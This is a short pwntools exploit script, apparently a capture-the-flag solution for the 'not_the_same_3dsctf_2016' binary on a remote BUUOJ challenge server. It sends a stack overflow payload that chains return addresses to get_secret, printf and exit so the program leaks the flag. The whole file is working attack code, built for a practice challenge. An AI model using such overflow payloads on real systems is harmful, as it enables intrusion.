from pwn import *
context.log_level = 'debug'
get_secret = 0x080489a0
fl4g = 0x080eca2d
printf = 0x0804f0a0
exit = 0x0804e660
ret = 0x080489de
conn = remote('node4.buuoj.cn', 25337)
#conn = process('./not_the_same_3dsctf_2016')
#gdb.attach(conn, 'b *0x080489e0')
#conn.recvuntil(b'b0r4 v3r s3 7u 4h o b1ch4o m3m0... ')

payload = b'a' * (0x2d) + p32(ret) + p32(get_secret) + p32(printf) + p32(exit) + p32(fl4g)
conn.sendline(payload)
conn.recv()

